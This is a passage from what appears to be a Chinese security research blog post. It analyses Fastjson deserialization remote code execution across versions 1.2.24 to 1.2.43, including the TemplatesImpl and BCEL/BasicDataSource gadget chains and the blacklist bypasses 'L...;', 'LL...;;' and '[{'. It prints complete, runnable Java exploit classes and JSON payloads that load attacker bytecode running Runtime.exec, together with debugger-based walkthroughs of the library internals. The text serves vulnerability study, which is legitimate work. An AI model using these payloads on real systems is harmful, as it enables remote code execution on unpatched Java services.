class="hljs-string">&quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://cdn.clown2024.cn/202408301123547.png" alt="image-20240830112259389"></p><p><strong>调用流程分析</strong></p><p>Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发</p><p>现在parseObject下断点，然后跟进</p><p><img src="https://cdn.clown2024.cn/202408301652896.png" alt="image-20240830165233826"></p><p>继续跟进这个DefaultJSONParser方法</p><p><img src="https://cdn.clown2024.cn/202408301658846.png" alt="image-20240830165823736"></p><p>这里token赋的值为12，先记住</p><p><img src="https://cdn.clown2024.cn/202408301700254.png" alt="image-20240830170035160"></p><p>然后继续跟进parseObject方法</p><p><img src="https://cdn.clown2024.cn/202408301704915.png" alt="image-20240830170443834"></p><p>一路跟进到DefaultJSONParser的parse方法，继续往下</p><p><img src="https://cdn.clown2024.cn/202408301706899.png" alt="image-20240830170659818"></p><p>然后根据token为12代表”{“判断到这，我们跟进parseObject方法</p><p><img src="https://cdn.clown2024.cn/202408301709246.png" alt="image-20240830170954179"></p><p>进到这里遍历lexer的text属性里我们传的json字符串，一开始扫描到’”‘字符</p><p>然后就走到下面这里</p><p><img src="https://cdn.clown2024.cn/202408301713804.png" alt="image-20240830171321736"></p><p>然后取得key为@type</p><p><img src="https://cdn.clown2024.cn/202408301715496.png" alt="image-20240830171538418"></p><p>然后继续往下</p><p><img src="https://cdn.clown2024.cn/202408301720580.png" alt="image-20240830172002493"></p><p>这里的DEFAULT_TYPE_KEY就是@type，然后调用scanSymbol()获取到了@type对应的指定类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，并调用TypeUtils.loadClass()函数加载该类</p><p>继续往下</p><p><img src="https://cdn.clown2024.cn/202408301723344.png" alt="image-20240830172310261"></p><p>这里对类名进行了判断，涉及到后面新版本绕过黑名单的方法先留意一下</p><p>现在继续往下</p><p><img src="https://cdn.clown2024.cn/202408301725620.png" alt="image-20240830172504533"></p><p>这里通过AppClassLoader加载后put到mappings里面</p><p>返回后，程序继续回到<code>DefaultJSONParser.parseObject()</code>中往下执行，在最后调用<code>JavaBeanDeserializer.deserialze()</code>对目标类进行反序列化</p><p><img src="https://cdn.clown2024.cn/202408301727881.png" alt="image-20240830172750780"></p><p><strong>关键利用链</strong></p><p>来根据payload看一下关键的属性对应的set和get方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +<br>                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; +<br>                    &quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;<br></code></pre></td></tr></table></figure><p>我们知道fastjson的JSON.parseObject会调用get和set方法，这里利用的是TemplatesImpl的get方法</p><p><img src="https://cdn.clown2024.cn/202408302131055.png" alt="image-20240830213116051"></p><p>然后后面其实就是cc链的动态类加载部分，链子如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl#newTransformer()-&gt;TemplatesImpl#getTransletInstance()-&gt;TemplatesImpl#defineTransletClasses()-&gt;defineClass<br></code></pre></td></tr></table></figure><p>然后回忆一下有些地方为什么要赋值</p><p><img src="https://cdn.clown2024.cn/202408302145512.png" alt="image-20240830214556445"></p><p>这里_tfactory要调用方法所以不能为空要赋值</p><p><img src="https://cdn.clown2024.cn/202408302146869.png" alt="image-20240830214643793"></p><p>这里要调用defineTransletClasses()方法所以_name!&#x3D;null，_class&#x3D;&#x3D;null后面就没有了</p><blockquote><p>这里y4师傅的payload还带了一个version我不知道为什么，我去掉了也是能够正常弹计算器的</p></blockquote><p><strong>base64</strong></p><p>再看一下为什么需要将字节码进行base64处理</p><p>这是因为FastJson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对 <code>_bytecodes</code> 进行Base64处理</p><p><img src="https://cdn.clown2024.cn/202408302203171.png" alt="image-20240830220348083"></p><p><img src="https://cdn.clown2024.cn/202408302204473.png" alt="image-20240830220404414"></p><p><strong>关于下划线的处理</strong></p><p><img src="https://cdn.clown2024.cn/202408302206839.png" alt="image-20240830220656753"></p><p>是在这个地方的smartMatch函数</p><p><img src="https://cdn.clown2024.cn/202408302207795.png" alt="image-20240830220749721"></p><p>然后在这里将下划线进行了替换</p><h1 id="fastjson1115-1224与bcel字节码加载"><a href="#Fastjson1-1-15-1-2-24与BCEL字节码加载" class="headerlink" title="Fastjson1.1.15-1.2.24与BCEL字节码加载"></a>Fastjson1.1.15-1.2.24与BCEL字节码加载</h1><p>参考文章：<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a>，<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">Java动态类加载，当FastJson遇到内网 – KINGX</a></p><p>这种和上面的TemplatesImpl链子打法都可以用于不出网的打法，不过比TemplatesImpl利用更广泛一点</p><p>这里我们还需要一个依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>先给出只用parse就能触发的payload形式</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//这个可有可无都不影响</span><br>        <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>利用代码：</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><span class="hljs-comment">//        String payload=&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;            \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;+code+&quot;\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;  //这个在parseObject的时候适用</span><br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409040119696.png" alt="image-20240904011923509"></p><p><strong>利用链分析</strong></p><p>去看一下BasicDataSource的源码中对应的关键方法</p><p><img src="https://cdn.clown2024.cn/202409032251464.png" alt="image-20240903225126325"></p><p><img src="https://cdn.clown2024.cn/202409032305310.png" alt="image-20240903230514187"></p><p>好吧想自己去看发现好像这个调用不太一样，这是会调用的set方法，文章的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()<br></code></pre></td></tr></table></figure><p>这是文章的解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">按理说应该是不会调用到getConnection方法的，原PoC中很巧妙的利用了 JSONObject对象的 toString() 方法实现了突破。JSONObject是Map的子类，在执行toString() 时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的 getter 等方法。<br><br>首先，在 &#123;“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……&#125; 这一整段外面再套一层&#123;&#125;，反序列化生成一个 JSONObject 对象。<br><br>然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法，于是乎就触发了BasicDataSource.getConnection()。<br></code></pre></td></tr></table></figure><blockquote><p>感觉文章讲得都有点怪，然后自己调了半天才找到确切位置，接下来分析也不知道正不正确，能说服我自己就好（</p></blockquote><p><img src="https://cdn.clown2024.cn/202409040058412.png" alt="image-20240904005819248"></p><p>首先走到parseObject这里，然后一直往下</p><p><img src="https://cdn.clown2024.cn/202409040100256.png" alt="image-20240904010058091"></p><p>走到这会调用key的toString方法，这时候value为BasicDataSource的时候是关键我们跟进去看</p><p><img src="https://cdn.clown2024.cn/202409040103451.png" alt="image-20240904010314293"></p><p>然后到这个write方法，继续往下</p><p><img src="https://cdn.clown2024.cn/202409040105060.png" alt="image-20240904010542894"></p><p>然后进到一个Map的遍历里面，前面进行了一些操作将他转成了Map类型，继续往下</p><p><img src="https://cdn.clown2024.cn/202409040108276.png" alt="image-20240904010839142"></p><p>这里就是最后的方法了，对字段进行遍历</p><p><img src="https://cdn.clown2024.cn/202409040111143.png" alt="image-20240904011101980"></p><p>这里对每个field进行遍历，然后调用他们的get方法，这里遍历到connection就会调用我们提到的getConnection</p><p><img src="https://cdn.clown2024.cn/202409040112186.png" alt="image-20240904011236055"></p><p><img src="https://cdn.clown2024.cn/202409040113127.png" alt="image-20240904011312996"></p><p><img src="https://cdn.clown2024.cn/202409040051567.png" alt="image-20240904005104420"></p><p>最终成功调用，其实调的我还是有点不明不白，只能说大致知道</p><p>如果是parseObject的话，他会触发所有get和set方法，直接这种payload也可以：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b......&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>除了上面的依赖还有一些适用更广泛的依赖，不过利用依旧是BasicDataSource类</p><p>在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>比如：6.0.53、7.0.81等版本</p><p>在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><h1 id="fastjson1225-1241绕过"><a href="#Fastjson1-2-25-1-2-41绕过" class="headerlink" title="Fastjson1.2.25-1.2.41绕过"></a>Fastjson1.2.25-1.2.41绕过</h1><p>Fastjson在1.2.25版本就加入了黑白名单机制</p><p>这时候我们再去执行前面的exp就会爆出下面的错误</p><p><img src="https://cdn.clown2024.cn/202408302326388.png" alt="image-20240830232605306"></p><p>再去看ParserConfig里面可以看到很多类被加入了黑名单</p><p><img src="https://cdn.clown2024.cn/202408302328066.png" alt="image-20240830232822995"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload,org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss,org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>先给出绕过的payload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>; <span class="hljs-comment">//前面加了L，结尾加了;</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408310015033.png" alt="image-20240831001535905"></p><p>然后来看一下具体的绕过原理</p><p>先去看一下checkAutoType函数在哪里被调用</p><p><img src="https://cdn.clown2024.cn/202408310022516.png" alt="image-20240831002214426"></p><p>我们可以对比之前的版本来看，之前的版本是直接loadClass了，我们进到这个函数里面看看</p><p><img src="https://cdn.clown2024.cn/202408310026977.png" alt="image-20240831002652886"></p><p>这里我们如果设置了autoTypeSupport为true他就会去将我们的这个类去匹配白名单，匹配到了就loadClass</p><p>如果没匹配到就会进到下面黑名单的匹配</p><p><img src="https://cdn.clown2024.cn/202408310030353.png" alt="image-20240831003005272"></p><p>匹配到黑名单就会抛出异常<strong>autoType is not support</strong></p><p><img src="https://cdn.clown2024.cn/202408310032079.png" alt="image-20240831003254981"></p><p>如果没有开启autoTypeSupport就会先匹配黑名单再匹配白名单</p><p>最后如果要是黑白名单都匹配不到，autoTypeSupport为true且expectClass不为null就直接loadClass</p><p><img src="https://cdn.clown2024.cn/202408310036025.png" alt="image-20240831003602958"></p><p>否则就不加载这个类了直接，我们payload最后进到的就是黑白名单都加载不到的loadClass，我们进loadClass方法里面看一下</p><p><img src="https://cdn.clown2024.cn/202408310039880.png" alt="image-20240831003942791"></p><p>这里就遇到了我们前面提到的用来绕过的地方</p><p>先看第一个箭头处的代码，如果类名的字符串以[开头，则说明该类是一个数组类型，需要递归调用loadClass方法来加载数组元素类型对应的class对象然后使用Array.newInstance方法来创建一个空数组对象，最后返回该数组对象的class对象</p><p>第二个箭头处的代码，如果类名的字符串以L开头并以;结尾，则说明该类是一个普通的Java类，需要把开头的L和结尾的;给去掉，然后递归调用loadClass</p><p>那其实就很清晰了，很容易就明白我们前面payload的绕过原理</p><blockquote><p>不用[的原因是fastjson在前面已经判断过是否为数组了，实际走不到这一步</p></blockquote><p>绕过就两步</p><ol><li>开启autoTypeSupport</li><li>L开头;结尾</li></ol><p>不过这个参数要在服务端手动开启，默认为false启用白名单，有点不好利用我感觉</p><h1 id="fastjson1242"><a href="#FastJson1-2-42" class="headerlink" title="FastJson1.2.42"></a>FastJson1.2.42</h1><p>该版本修改了下面两点：</p><ul><li>黑名单改为了hash值，防止绕过</li><li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li></ul><p><img src="https://cdn.clown2024.cn/202408310051883.png" alt="image-20240831005115787"></p><blockquote><p>笑死了，文章还没看完猜测是不是就提前校验删了一次，直接猜双写能不能绕过，结果真绕过去了🤣</p></blockquote><p>看一下他的checkAutoType函数变化</p><p><img src="https://cdn.clown2024.cn/202408311524654.png" alt="image-20240831152406512"></p><p>总之这里就是对字符串进行了截取但只截取了一次</p><p>TemplatesImpl的exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.42</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>; <span class="hljs-comment">//前面加了L，结尾加了; 进行了双写绕过</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="fastjson1243"><a href="#FastJson1-2-43" class="headerlink" title="FastJson1.2.43"></a>FastJson1.2.43</h1><p>这个版本又是修改了checkAutoType函数，这次对于LL等开头结尾的字符串直接抛出异常</p><p>上面payload执行结果</p><p><img src="https://cdn.clown2024.cn/202408311527303.png" alt="image-20240831152750175"></p><p>看一下checkAutoType函数</p><p><img src="https://cdn.clown2024.cn/202408311530201.png" alt="image-20240831153008103"></p><p>这里直接就抛异常了</p><p>但是没有对[进行限制，可以通过[{来绕过，改后的exp如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.43</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span 